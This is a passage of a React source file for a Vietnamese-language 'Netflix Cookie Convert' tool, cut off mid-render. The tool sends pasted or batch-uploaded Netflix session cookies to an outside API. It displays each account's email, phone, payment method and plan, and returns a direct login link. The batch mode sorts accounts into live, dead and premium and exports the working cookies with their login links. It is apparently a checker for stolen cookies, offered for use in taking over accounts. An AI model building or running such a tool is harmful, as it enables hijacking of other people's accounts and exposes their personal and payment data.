import { useState, useEffect, useRef, useCallback } from "react";

const ANIME_DECOR_1 = "https://i.pinimg.com/736x/f2/d6/51/f2d651321a205396beb55ff6b4b6c1b9.jpg";
const CAPCUT_LOGO = "https://ucarecdn.com/31b7cc92-4e3e-4409-a040-3975b01bf3cc/-/format/auto/";
const NETFLIX_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/1920px-Netflix_2015_logo.svg.png";
const API = "https://cknetflix.vercel.app";

function useIsMobile() {
  const [isMobile, setIsMobile] = useState(false);
  useEffect(() => {
    const check = () => setIsMobile(window.innerWidth <= 768);
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);
  return isMobile;
}

/* ═══════════════════════════════════════════════════
   NETFLIX TOOL COMPONENT
   ═══════════════════════════════════════════════════ */
function NetflixTool({ onBack, isMobile }) {
  const [tab, setTab] = useState("single");
  const [cookie, setCookie] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [info, setInfo] = useState(null);
  const [loginLink, setLoginLink] = useState("");
  const [toastMsg, setToastMsg] = useState("");

  /* Batch */
  const [batchFiles, setBatchFiles] = useState([]);
  const [batchRunning, setBatchRunning] = useState(false);
  const batchStopRef = useRef(false);
  const [batchProgress, setBatchProgress] = useState({ done: 0, total: 0 });
  const [batchStats, setBatchStats] = useState({ live: 0, die: 0, prem: 0, total: 0 });
  const [batchCountries, setBatchCountries] = useState({});
  const [batchResults, setBatchResults] = useState([]);
  const [batchFilter, setBatchFilter] = useState("ALL");
  const [batchPlanFilter, setBatchPlanFilter] = useState("ALL");
  const fileInputRef = useRef(null);
  const fileMultiRef = useRef(null);

  const toast = useCallback((msg) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(""), 2200);
  }, []);

  /* ── API ── */
  async function apiCheck(content) {
    const res = await fetch(API + "/api/check", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content, mode: "fullinfo" }),
    });
    if (!res.ok) throw new Error("HTTP " + res.status);
    return res.json();
  }

  async function fetchRefNow() {
    try {
      const res = await fetch("https://worldtimeapi.org/api/ip", { signal: AbortSignal.timeout(8000) });
      const j = await res.json();
      if (j.unixtime) return { date: new Date(j.unixtime * 1000), source: "worldtimeapi.org" };
      if (j.datetime) { const d = new Date(j.datetime); if (!isNaN(d)) return { date: d, source: "worldtimeapi.org" }; }
    } catch {}
    return { date: new Date(), source: "local" };
  }

  /* ── Billing helpers ── */
  function normBilling(s) {
    if (!s) return "";
    return s.trim().replace(/\\x2B/gi, "+").replace(/\\x2D/gi, "-").replace(/\\x3A/gi, ":");
  }

  function parseBillingDate(str) {
    if (!str) return null;
    const s = normBilling(str);
    let d = new Date(s);
    if (!isNaN(d.getTime())) return d;
    const m1 = s.match(/(\w+)\s+(\d{1,2})(?:st|nd|rd|th)?,?\s*(\d{4})/i);
    if (m1) { d = new Date(m1[1] + " " + m1[2] + ", " + m1[3]); if (!isNaN(d)) return d; }
    return null;
  }

  function formatBilling(nextBilling, refNow) {
    if (!nextBilling) return "N/A";
    const norm = normBilling(String(nextBilling));
    const target = parseBillingDate(norm);
    if (!target) return norm.length > 50 ? norm.slice(0, 50) + "..." : norm;
    const today = new Date(refNow.getFullYear(), refNow.getMonth(), refNow.getDate());
    const billDay = new Date(target.getFullYear(), target.getMonth(), target.getDate());
    const diff = Math.round((billDay - today) / 864e5);
    const compact = billDay.getFullYear() + "-" + (billDay.getMonth() + 1) + "-" + billDay.getDate();
    if (diff > 0) return compact + " \u2192 c\u00f2n " + diff + " ng\u00e0y";
    if (diff === 0) return compact + " \u2192 h\u00f4m nay";
    return compact + " \u2192 qu\u00e1 h\u1ea1n " + Math.abs(diff) + " ng\u00e0y";
  }

  function timeStr(sec) {
    if (!sec || sec <= 0) return "H\u1ebft h\u1ea1n";
    const d = Math.floor(sec / 86400), h = Math.floor((sec % 86400) / 3600), m = Math.floor((sec % 3600) / 60);
    return d + "d " + h + "h " + m + "m";
  }

  function extractBillingFromAPI(a) {
    if (!a) return null;
    const fields = ["next_billing","nextBillingDate","next_billing_date","renewalDate","billingDate","currentPeriodEnd"];
    for (const f of fields) {
      if (a[f] && String(a[f]).trim() && !["unknown","n/a","null","undefined"].includes(String(a[f]).trim().toLowerCase()))
        return String(a[f]).trim();
    }
    return null;
  }

  /* ── Single check ── */
  async function handleSingleCheck() {
    if (!cookie.trim()) { setError("\u26a0 Nh\u1eadp cookie!"); return; }
    setError(""); setInfo(null); setLoginLink(""); setLoading(true);
    try {
      const refMeta = await fetchRefNow();
      const r = await apiCheck(cookie.trim());
      if (r.status === "success" && r.account_info) {
        const a = r.account_info;
        const t = r.token_result;
        const refNow = refMeta.date;
        const apiBilling = extractBillingFromAPI(a);
        setInfo({
          ok: a.ok,
          email: (a.email || "N/A").replace(/\\x40/g, "@"),
          country: a.country || "N/A",
          plan: a.plan || "N/A",
          premium: !!a.premium,
          price: a.plan_price || "N/A",
          streams: a.max_streams || "N/A",
          quality: a.video_quality || "N/A",
          profiles: a.profiles || "N/A",
          billing: apiBilling ? formatBilling(apiBilling, refNow) : formatBilling(a.next_billing, refNow),
          remain: t ? timeStr(t.time_remaining) : "N/A",
          phone: a.phone || "N/A",
          payment: a.payment_method || "N/A",
          since: a.member_since || "N/A",
          checkTime: refNow.toLocaleString() + " \u2022 " + refMeta.source,
        });
        if (t && t.status === "Success" && t.direct_login_url) setLoginLink(t.direct_login_url);
        toast("\u2705 Check th\u00e0nh c\u00f4ng!");
      } else {
        setError("\u274c " + (r.message || r.detail || "API tr\u1ea3 v\u1ec1 l\u1ed7i"));
      }
    } catch (e) {
      setError("\u274c " + e.message);
    } finally { setLoading(false); }
  }

  function handleCopy(text) {
    navigator.clipboard.writeText(text).then(() => toast("\u2705 \u0110\u00e3 copy!")).catch(() => {
      const t = document.createElement("textarea"); t.value = text; document.body.appendChild(t); t.select(); document.execCommand("copy"); document.body.removeChild(t); toast("\u2705 \u0110\u00e3 copy!");
    });
  }

  /* ── Batch ── */
  function handleFileSelect(files) {
    const txtFiles = Array.from(files).filter(f => f.name.endsWith(".txt"));
    setBatchFiles(txtFiles);
  }

  function cEmoji(c) {
    try { if (c.length !== 2) return "\ud83c\udf10"; return String.fromCodePoint(...Array.from(c.toUpperCase()).map(x => 0x1F1E6 + x.charCodeAt(0) - 65)); } catch { return "\ud83c\udf10"; }
  }

  async function handleBatchStart() {
    if (batchRunning || !batchFiles.length) return;
    setBatchRunning(true);
    batchStopRef.current = false;
    setBatchResults([]); setBatchStats({ live: 0, die: 0, prem: 0, total: 0 });
    setBatchCountries({}); setBatchFilter("ALL"); setBatchPlanFilter("ALL");

    const refMeta = await fetchRefNow();
    const refNow = refMeta.date;
    const total = batchFiles.length;
    let done = 0, live = 0, die = 0, prem = 0;
    const countries = {};
    const results = [];

    for (let i = 0; i < batchFiles.length; i++) {
      if (batchStopRef.current) break;
      done++;
      setBatchProgress({ done, total });

      let text = "";
      try { text = await batchFiles[i].text(); } catch { die++; setBatchStats({ live, die, prem, total: done }); continue; }
      if (!text.trim()) { die++; setBatchStats({ live, die, prem, total: done }); continue; }

      try {
        const r = await apiCheck(text.trim());
        if (r.status === "success" && r.account_info && r.account_info.ok) {
          live++;
          const a = r.account_info;
          const t = r.token_result;
          const co = (a.country || "??").toUpperCase();
          countries[co] = (countries[co] || 0) + 1;
          if (a.premium) prem++;
          const apiBilling = extractBillingFromAPI(a);
          results.push({
            email: (a.email || "N/A").replace(/\\x40/g, "@"),
            country: co, plan: a.plan || "N/A", isPrem: !!a.premium,
            streams: a.max_streams || "N/A", quality: a.video_quality || "N/A",
            billing: apiBilling ? formatBilling(apiBilling, refNow) : formatBilling(a.next_billing, refNow),
            linkExpiry: t ? timeStr(t.time_remaining) : "N/A",
            link: t && t.status === "Success" ? t.direct_login_url : "",
            file: batchFiles[i].name, cookie: text.trim(),
          });
        } else { die++; }
      } catch { die++; }

      setBatchStats({ live, die, prem, total: done });
      setBatchCountries({ ...countries });
      setBatchResults([...results]);
      if (!batchStopRef.current && i < batchFiles.length - 1) await new Promise(r => setTimeout(r, 600));
    }
    setBatchRunning(false);
  }

  function handleBatchSave() {
    if (!batchResults.length) { toast("\u274c Kh\u00f4ng c\u00f3 d\u1eef li\u1ec7u!"); return; }
    let out = "=".repeat(70) + "\n  Cookie Convert - K\u1ebft qu\u1ea3 Batch Check\n  " + new Date().toLocaleString() + "\n" + "=".repeat(70) + "\n\n";
    out += "T\u1ed5ng: " + batchStats.total + " | Live: " + batchStats.live + " | Die: " + batchStats.die + " | Premium: " + batchStats.prem + "\n\n";
    batchResults.forEach(function(r, i) {
      out += "[" + (i + 1) + "] " + r.file + "\n  Email: " + r.email + "\n  Qu\u1ed1c gia: " + r.country + "\n  G\u00f3i: " + r.plan + "\n  Billing: " + r.billing + "\n  Link h\u1ebft h\u1ea1n: " + r.linkExpiry + "\n";
      if (r.link) out += "  Login Link: " + r.link + "\n";
      out += "\n  --- COOKIE ---\n" + r.cookie + "\n  --- END ---\n\n" + "\u2500".repeat(70) + "\n\n";
    });
    const blob = new Blob([out], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href = url; a.download = "batch_" + new Date().toISOString().slice(0, 10) + ".txt";
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    URL.revokeObjectURL(url);
    toast("\u2705 \u0110\u00e3 l\u01b0u file!");
  }

  const filteredBR = batchResults.filter(function(r) {
    return (batchFilter === "ALL" || r.country === batchFilter) && (batchPlanFilter === "ALL" || r.plan === batchPlanFilter);
  });
  const allCountries = Array.from(new Set(batchResults.map(function(r) { return r.country; })));
  const allPlans = Array.from(new Set(batchResults.map(function(r) { return r.plan; }).filter(function(p) { return p !== "N/A"; })));

  function planBadge(plan) {
    var pl = (plan || "").toLowerCase();
    if (pl.includes("premium")) return { color: "#ffd700", bg: "rgba(255,215,0,.1)", border: "rgba(255,215,0,.2)" };
    if (pl.includes("standard") && !pl.includes("ads")) return { color: "#64b5f6", bg: "rgba(100,181,246,.1)", border: "rgba(100,181,246,.2)" };
    if (pl.includes("basic")) return { color: "#a0f0c0", bg: "rgba(0,255,136,.08)", border: "rgba(0,255,136,.15)" };
    if (pl.includes("ads") || pl.includes("mobile")) return { color: "#ff9a9a", bg: "rgba(255,68,68,.08)", border: "rgba(255,68,68,.15)" };
    return { color: "rgba(200,180,220,.5)", bg: "rgba(200,180,220,.08)", border: "rgba(200,180,220,.15)" };
  }

  var infoFields = info ? [
    { icon: "\ud83d\udce7", key: "Email", val: info.email },
    { icon: "\ud83c\udf0d", key: "Qu\u1ed1c gia", val: info.country },
    { icon: "\ud83d\udc8e", key: "G\u00f3i", val: info.plan },
    { icon: "\ud83d\udcb0", key: "Gi\u00e1", val: info.price },
    { icon: "\ud83d\udcfa", key: "Max Streams", val: info.streams },
    { icon: "\ud83c\udf9e", key: "Ch\u1ea5t l\u01b0\u1ee3ng", val: info.quality },
    { icon: "\ud83d\udc64", key: "Profiles", val: info.profiles },
    { icon: "\ud83d\udd50", key: "Gi\u1edd ki\u1ec3m tra", val: info.checkTime },
    { icon: "\ud83d\udcc5", key: "Ng\u00e0y thanh to\u00e1n ti\u1ebfp", val: info.billing },
    { icon: "\u23f3", key: "Th\u1eddi gian link h\u1ebft h\u1ea1n", val: info.remain },
    { icon: "\ud83d\udcde", key: "Phone", val: info.phone },
    { icon: "\ud83d\udcb3", key: "Payment", val: info.payment },
    { icon: "\ud83d\udd12", key: "Member Since", val: info.since },
  ] : [];

  /* ═══════ RENDER ═══════ */
  return (
    <div style={{ maxWidth: "560px", width: "100%", margin: "0 auto" }}>
      <style>{
        "@keyframes spin{to{transform:rotate(360deg)}}" +
        ".nf-scroll::-webkit-scrollbar{width:5px}" +
        ".nf-scroll::-webkit-scrollbar-thumb{background:rgba(255,107,157,.4);border-radius:10px}"
      }</style>

      {/* Header */}
      <div style={{ position: "relative", height: isMobile ? "110px" : "145px", overflow: "hidden", borderRadius: "16px 16px 0 0", borderBottom: "2px solid rgba(255,107,157,.25)" }}>
        <img src={ANIME_DECOR_1} alt="" style={{ width: "100%", height: "100%", objectFit: "cover", objectPosition: "center 20%", filter: "brightness(.6) saturate(1.2)", display: "block" }} />
        <div style={{ position: "absolute", inset: 0, background: "linear-gradient(180deg,rgba(15,12,41,.1),rgba(15,12,41,.88))" }} />
        <button onClick={onBack} style={{ position: "absolute", top: "10px", left: "12px", zIndex: 10, padding: "6px 12px", borderRadius: "10px", border: "1px solid rgba(255,200,120,.5)", background: "rgba(0,0,0,.5)", color: "#ffe9a8", cursor: "pointer", fontSize: "11px", fontWeight: 800, letterSpacing: ".4px", textTransform: "uppercase" }}>
          \u2190 Quay l\u1ea1i
        </button>
        <div style={{ position: "absolute", bottom: "12px", left: 0, right: 0, textAlign: "center" }}>
          <div style={{ fontFamily: "'Zen Maru Gothic','Quicksand',sans-serif", fontSize: isMobile ? "15px" : "19px", fontWeight: 900, color: "#fff", textShadow: "0 0 10px rgba(255,107,157,.8),0 0 30px rgba(255,107,157,.4)" }}>
            \ud83c\udf38 Netflix Cookie Convert
          </div>
          <div style={{ fontSize: "10px", color: "rgba(255,182,211,.7)", marginTop: "2px", letterSpacing: "3px", textTransform: "uppercase" }}>
            Convert \u2022 Check \u2022 Get Info
          </div>
        </div>
      </div>

      {/* Body */}
      <div className="nf-scroll" style={{ padding: isMobile ? "12px" : "14px 16px 16px", background: "linear-gradient(165deg,#0f0c29,#1a1040 35%,#24243e)", border: "1.5px solid rgba(255,107,157,.3)", borderTop: "none", borderRadius: "0 0 16px 16px", maxHeight: isMobile ? "calc(100vh - 180px)" : "calc(100vh - 220px)", overflowY: "auto" }}>

        {/* Tabs */}
        <div style={{ display: "flex", marginBottom: "12px", background: "rgba(255,255,255,.03)", borderRadius: "9px", padding: "3px", border: "1px solid rgba(255,107,157,.08)" }}>
          {["single", "batch"].map(function(t) {
            var active = tab === t;
            return (
              <div key={t} onClick={function() { setTab(t); }} style={{ flex: 1, padding: "8px 0", textAlign: "center", fontSize: isMobile ? "11px" : "12px", fontWeight: 700, color: active ? "#ffb6d3" : "rgba(255,182,211,.4)", cursor: "pointer", borderRadius: "7px", transition: "all .3s", letterSpacing: ".7px", textTransform: "uppercase", background: active ? "linear-gradient(135deg,rgba(255,107,157,.18),rgba(138,43,226,.12))" : "transparent" }}>
                {t === "single" ? "\u26a1 Single" : "\ud83d\udcc2 Batch"}
              </div>
            );
          })}
        </div>

        {/* ══════ SINGLE ══════ */}
        {tab === "single" && (
          <div>
            <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "2.5px", textTransform: "uppercase", color: "rgba(255,182,211,.55)", marginBottom: "6px", display: "flex", alignItems: "center", gap: "5px" }}>
              <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#ff6b9d", boxShadow: "0 0 6px rgba(255,107,157,.6)", flexShrink: 0 }} />
              \ud83c\udf6a D\u00e1n Cookie Netflix
            </div>
            <textarea
              placeholder="D\u00e1n cookie Netflix (JSON / Netscape / text)..."
              value={cookie}
              onChange={function(e) { setCookie(e.target.value); }}
              style={{ width: "100%", minHeight: isMobile ? "65px" : "75px", padding: "9px 11px", borderRadius: "10px", border: "1.5px solid rgba(255,107,157,.18)", background: "rgba(255,255,255,.035)", color: "#e0d6f0", fontFamily: "Consolas,'Courier New',monospace", fontSize: isMobile ? "10px" : "11px", lineHeight: 1.5, resize: "vertical", outline: "none", boxSizing: "border-box" }}
            />
            <div style={{ display: "flex", gap: "6px", marginTop: "8px" }}>
              <button disabled={loading} onClick={handleSingleCheck} style={{ flex: 1, display: "inline-flex", alignItems: "center", justifyContent: "center", gap: "5px", padding: "8px 14px", borderRadius: "9px", border: "none", background: "linear-gradient(135deg,#ff6b9d,#c850c0,#8a2be2)", color: "#fff", fontFamily: "'Quicksand',sans-serif", fontSize: "11.5px", fontWeight: 700, cursor: loading ? "not-allowed" : "pointer", opacity: loading ? 0.6 : 1, textTransform: "uppercase", letterSpacing: ".7px" }}>
                {loading ? (<><span style={{ display: "inline-block", width: 14, height: 14, border: "2px solid rgba(255,255,255,.2)", borderTopColor: "#ff6b9d", borderRadius: "50%", animation: "spin .7s linear infinite" }} /> \u0110ang check...</>) : "\u26a1 Convert"}
              </button>
              <button onClick={function() { setCookie(""); setInfo(null); setLoginLink(""); setError(""); }} style={{ flex: 1, display: "inline-flex", alignItems: "center", justifyContent: "center", gap: "5px", padding: "8px 14px", borderRadius: "9px", border: "1.5px solid rgba(255,107,157,.25)", background: "linear-gradient(135deg,rgba(255,107,157,.1),rgba(138,43,226,.08))", color: "#ffb6d3", fontFamily: "'Quicksand',sans-serif", fontSize: "11.5px", fontWeight: 700, cursor: "pointer", textTransform: "uppercase", letterSpacing: ".7px" }}>
                \ud83d\uddd1 Xo\u00e1
              </button>
            </div>

            {error && <div style={{ marginTop: "8px", padding: "8px 10px", borderRadius: "8px", background: "rgba(255,68,68,.06)", border: "1px solid rgba(255,68,68,.15)", color: "#ff8888", fontSize: "11px", textAlign: "center" }}>{error}</div>}

            {/* Info panel */}
            {info && (
              <div style={{ marginTop: "12px", padding: "11px 13px", borderRadius: "12px", border: "1.5px solid rgba(255,107,157,.1)", background: "rgba(255,255,255,.02)" }}>
                <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "2.5px", textTransform: "uppercase", color: "rgba(255,182,211,.55)", marginBottom: "6px", display: "flex", alignItems: "center", gap: "5px" }}>
                  <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#ff6b9d", boxShadow: "0 0 6px rgba(255,107,157,.6)", flexShrink: 0 }} />
                  \ud83d\udccb Th\u00f4ng tin t\u00e0i kho\u1ea3n
                </div>
                {/* Badges */}
                <div style={{ display: "flex", gap: "5px", marginBottom: "8px", flexWrap: "wrap" }}>
                  {info.ok
                    ? <span style={{ display: "inline-flex", alignItems: "center", gap: 3, padding: "3px 9px", borderRadius: 14, fontSize: 10, fontWeight: 700, background: "rgba(0,255,136,.1)", border: "1px solid rgba(0,255,136,.2)", color: "#00ff88" }}>\u25cf LIVE</span>
                    : <span style={{ display: "inline-flex", alignItems: "center", gap: 3, padding: "3px 9px", borderRadius: 14, fontSize: 10, fontWeight: 700, background: "rgba(255,68,68,.1)", border: "1px solid rgba(255,68,68,.2)", color: "#ff4444" }}>\u25cf DIE</span>
                  }
                  {info.premium && <span style={{ display: "inline-flex", alignItems: "center", gap: 3, padding: "3px 9px", borderRadius: 14, fontSize: 10, fontWeight: 700, background: "rgba(255,215,0,.1)", border: "1px solid rgba(255,215,0,.2)", color: "#ffd700" }}>\u2b50 PREMIUM</span>}
                  {(function() {
                    var pb = planBadge(info.plan);
                    return <span style={{ display: "inline-flex", alignItems: "center", gap: 3, padding: "3px 9px", borderRadius: 14, fontSize: 10, fontWeight: 700, background: pb.bg, border: "1px solid " + pb.border, color: pb.color }}>{info.plan}</span>;
                  })()}
                  <span style={{ display: "inline-flex", alignItems: "center", gap: 3, padding: "3px 9px", borderRadius: 14, fontSize: 10, fontWeight: 700, background: "rgba(100,181,246,.1)", border: "1px solid rgba(100,181,246,.2)", color: "#64b5f6" }}>{info.country}</span>
                </div>
                {/* Fields */}
                {infoFields.map(function(f, idx) {
                  return (
                    <div key={idx} style={{ display: "flex", alignItems: "center", padding: "5px 0", borderBottom: idx < infoFields.length - 1 ? "1px solid rgba(255,255,255,.03)" : "none", gap: "8px" }}>
                      <div style={{ width: 24, height: 24, borderRadius: 6, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 12, flexShrink: 0, background: "rgba(255,107,157,.07)", border: "1px solid rgba(255,107,157,.1)" }}>{f.icon}</div>
                      <div>
                        <div style={{ fontSize: "9px", textTransform: "uppercase", letterSpacing: "1.2px", color: "rgba(200,180,220,.4)", fontWeight: 600 }}>{f.key}</div>
                        <div style={{ fontSize: isMobile ? "11px" : "12px", color: "#e8dff5", fontWeight: 600, wordBreak: "break-all" }}>{f.val}</div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {/* Login link */}
            {loginLink && (
              <div style={{ marginTop: "10px" }}>
                <div style={{ height: 1, background: "linear-gradient(90deg,transparent,rgba(255,107,157,.2),transparent)", margin: "12px 0" }} />
                <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "2.5px", textTransform: "uppercase", color: "rgba(255,182,211,.55)", marginBottom: "6px", display: "flex", alignItems: "center", gap: "5px" }}>
                  <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#ff6b9d", boxShadow: "0 0 6px rgba(255,107,157,.6)", flexShrink: 0 }} />
                  \ud83d\udd17 Link \u0110\u0103ng Nh\u1eadp
                </div>
                <div style={{ padding: "8px 10px", borderRadius: "8px", background: "rgba(0,255,136,.03)", border: "1px solid rgba(0,255,136,.1)", color: "#a0f0c0", fontSize: isMobile ? "9px" : "10px", fontFamily: "Consolas,monospace", wordBreak: "break-all", maxHeight: "50px", overflowY: "auto" }}>{loginLink}</div>
                <div style={{ display: "flex", gap: "6px", marginTop: "8px" }}>
                  <button onClick={function() { handleCopy(loginLink); }} style={{ flex: 1, padding: "8px 14px", borderRadius: "9px", border: "1.5px solid rgba(255,107,157,.25)", background: "linear-gradient(135deg,rgba(255,107,157,.1),rgba(138,43,226,.08))", color: "#ffb6d3", fontSize: "11.5px", fontWeight: 700, cursor: "pointer", textTransform: "uppercase", letterSpacing: ".7px", fontFamily: "'Quicksand',sans-serif" }}>
                    \ud83d\udccb Sao ch\u00e9p
                  </button>
                  <button onClick={function() { window.open(loginLink, "_blank"); }} style={{ flex: 1, padding: "8px 14px", borderRadius: "9px", border: "none", background: "linear-gradient(135deg,#ff6b9d,#c850c0,#8a2be2)", color: "#fff", fontSize: "11.5px", fontWeight: 700, cursor: "pointer", textTransform: "uppercase", letterSpacing: ".7px", fontFamily: "'Quicksand',sans-serif" }}>
                    \ud83d\ude80 M\u1edf link
                  </button>
                </div>
                <div style={{ marginTop: "8px", padding: "6px 10px", borderRadius: "8px", background: "rgba(255,200,50,.04)", border: "1px solid rgba(255,200,50,.12)", color: "#ffd966", fontSize: "10px", fontWeight: 600, textAlign: "center" }}>
                  \u26a0\ufe0f L\u01b0u \u00fd: Link t\u1ed3n t\u1ea1i trong 24h
                </div>
              </div>
            )}
          </div>
        )}

        {/* ══════ BATCH ══════ */}
        {tab === "batch" && (
          <div>
            <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "2.5px", textTransform: "uppercase", color: "rgba(255,182,211,.55)", marginBottom: "6px", display: "flex", alignItems: "center", gap: "5px" }}>
              <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#ff6b9d", boxShadow: "0 0 6px rgba(255,107,157,.6)", flexShrink: 0 }} />
              \ud83d\udcc2 Ch\u1ecdn file .txt cookie
            </div>

            <input ref={fileInputRef} type="file" multiple accept=".txt" style={{ display: "none" }} onChange={function(e) { handleFileSelect(e.target.files); }} />
            <input ref={fileMultiRef} type="file" multiple accept=".txt" style={{ display: "none" }} onChange={function(e) { handleFileSelect(e.target.files); }} />

            <div
              onClick={function() { fileInputRef.current && fileInputRef.current.click(); }}
              onDragOver={function(e) { e.preventDefault(); e.currentTarget.style.borderColor = "rgba(255,107,157,.45)"; }}
              onDragLeave={function(e) { e.currentTarget.style.borderColor = "rgba(255,107,157,.2)"; }}
              onDrop={function(e) { e.preventDefault(); e.currentTarget.style.borderColor = "rgba(255,107,157,.2)"; handleFileSelect(Array.from(e.dataTransfer.files).filter(function(f) { return f.name.endsWith(".txt"); })); }}
              style={{ border: "2px dashed rgba(255,107,157,.2)", borderRadius: "11px", padding: isMobile ? "14px 10px" : "18px 12px", textAlign: "center", cursor: "pointer", background: "rgba(255,107,157,.015)", marginBottom: "8px", transition: "all .3s" }}
            >
              <div style={{ color: "rgba(255,182,211,.45)", fontSize: "11px", fontWeight: 600 }}>\ud83d\udcc1 B\u1ea5m ch\u1ecdn ho\u1eb7c k\u00e9o th\u1ea3 file .txt</div>
              <div style={{ color: "rgba(255,182,211,.25)", fontSize: "9.5px", marginTop: "3px" }}>M\u1ed7i file ch\u1ee9a 1 cookie Netflix</div>
            </div>

            {batchFiles.length > 0 && <div style={{ fontSize: "10px", color: "rgba(255,182,211,.5)", marginBottom: "6px" }}>\ud83d\udcc4 {batchFiles.length} file .txt</div>}

            <div style={{ display: "flex", gap: "6px", marginTop: "8px" }}>
              <button disabled={batchFiles.length === 0 || batchRunning} onClick={handleBatchStart} style={{ flex: 1, display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 5, padding: "8px 14px", borderRadius: "9px", border: "none", background: "linear-gradient(135deg,#ff6b9d,#c850c0,#8a2be2)", color: "#fff", fontSize: "11.5px", fontWeight: 700, cursor: (batchFiles.length === 0 || batchRunning) ? "not-allowed" : "pointer", opacity: (batchFiles.length === 0 || batchRunning) ? 0.4 : 1, textTransform: "uppercase", letterSpacing: ".7px", fontFamily: "'Quicksand',sans-serif" }}>
                {batchRunning ? (<><span style={{ display: "inline-block", width: 14, height: 14, border: "2px solid rgba(255,255,255,.2)", borderTopColor: "#ff6b9d", borderRadius: "50%", animation: "spin .7s linear infinite" }} /> \u0110ang check...</>) : "\ud83d\ude80 Check t\u1ea5t c\u1ea3"}
              </button>
              <button disabled={!batchRunning} onClick={function() { batchStopRef.current = true; }} style={{ flex: 1, padding: "8px 14px", borderRadius: "9px", border: "1.5px solid rgba(255,107,157,.25)", background: "linear-gradient(135deg,rgba(255,107,157,.1),rgba(138,43,226,.08))", color: "#ffb6d3", fontSize: "11.5px", fontWeight: 700, cursor: !batchRunning ? "not-allowed" : "pointer", opacity: !batchRunning ? 0.4 : 1, textTransform: "uppercase", letterSpacing: ".7px", fontFamily: "'Quicksand',sans-serif" }}>
                \u23f9 D\u1eebng
              </button>
            </div>

            {/* Progress */}
            {batchProgress.total > 0 && (
              <div style={{ marginTop: "10px" }}>
                <div style={{ height: 5, background: "rgba(255,255,255,.05)", borderRadius: 3, overflow: "hidden", marginTop: 5 }}>
                  <div style={{ height: "100%", background: "linear-gradient(90deg,#ff6b9d,#c850c0)", borderRadius: 3, transition: "width .3s", width: Math.round(batchProgress.done / batchProgress.total * 100) + "%" }} />
                </div>
                <div style={{ fontSize: "9.5px", color: "rgba(255,182,211,.4)", marginTop: "4px", textAlign: "center" }}>
                  {batchRunning ? batchProgress.done + " / " + batchProgress.total : "\u2705 Xong! " + batchStats.live + " Live / " + batchStats.die + " Die / " + batchStats.prem + " Premium"}
                </div>
              </div>
            )}

            {/* Stats */}
            {batchStats.total > 0 && (
              <div style={{ marginTop: "12px", padding: "11px 13px", borderRadius: "12px", border: "1.5px solid rgba(255,107,157,.1)", background: "rgba(255,255,255,.02)" }}>
                <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "2.5px", textTransform: "uppercase", color: "rgba(255,182,211,.55)", marginBottom: "6px", display: "flex", alignItems: "center", gap: "5px" }}>
                  <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#ff6b9d", boxShadow: "0 0 6px rgba(255,107,157,.6)", flexShrink: 0 }} />
                  \ud83d\udcca Th\u1ed1ng k\u00ea
                </div>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "6px", marginTop: "8px" }}>
                  {[
                    { n: batchStats.live, l: "Live", c: "#00ff88" },
                    { n: batchStats.die, l: "Die", c: "#ff4444" },
                    { n: batchStats.prem, l: "Premium", c: "#ffd966" },
                    { n: batchStats.total, l: "T\u1ed5ng", c: "#64b5f6" },
                  ].map(function(s, idx) {
                    return (
                      <div key={idx} style={{ padding: "8px 10px", borderRadius: "9px", border: "1px solid rgba(255,107,157,.08)", background: "rgba(255,255,255,.015)", textAlign: "center" }}>
                        <div style={{ fontSize: "20px", fontWeight: 900, lineHeight: 1, color: s.c }}>{s.n}</div>
                        <div style={{ fontSize: "8px", textTransform: "uppercase", letterSpacing: "1.3px", color: "rgba(200,180,220,.35)", marginTop: "2px", fontWeight: 600 }}>{s.l}</div>
                      </div>
                    );
                  })}
                </div>

                {/* Countries */}
                {Object.keys(batchCountries).length > 0 && (
                  <div>
                    <div style={{ height: 1, background: "linear-gradient(90deg,transparent,rgba(255,107,157,.2),transparent)", margin: "12px 0" }} />
                    <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "2.5px", textTransform: "uppercase", color: "rgba(255,182,211,.55)", marginBottom: "6px", display: "flex", alignItems: "center", gap: "5px" }}>
                      <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#ff6b9d", boxShadow: "0 0 6px rgba(255,107,157,.6)", flexShrink: 0 }} />
                      \ud83c\udf0d Qu\u1ed1c gia
                    </div>
                    {Object.entries(batchCountries).sort(function(a, b) { return b[1] - a[1]; }).map(function(entry) {
                      return (
                        <div key={entry[0]} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "4px 8px", borderRadius: "6px", marginBottom: "2px", background: "rgba(255,255,255,.015)" }}>
                          <span style={{ fontSize: "11px", fontWeight: 700, color: "#e0d6f0" }}>{cEmoji(entry[0])} {entry[0]}</span>
                          <span style={{ fontSize: "11px", fontWeight: 700, color: "#ffb6d3" }}>{entry[1]}</span>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            )}

            {/* Batch results */}
            {batchResults.length > 0 && (
              <div style={{ marginTop: "8px", padding: "11px 13px", borderRadius: "12px", border: "1.5px solid rgba(255,107,157,.1)", background: "rgba(255,255,255,.02)" }}>
                <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "2.5px", textTransform: "uppercase", color: "rgba(255,182,211,.55)", marginBottom: "6px", display: "flex", alignItems: "center", gap: "5px" }}>
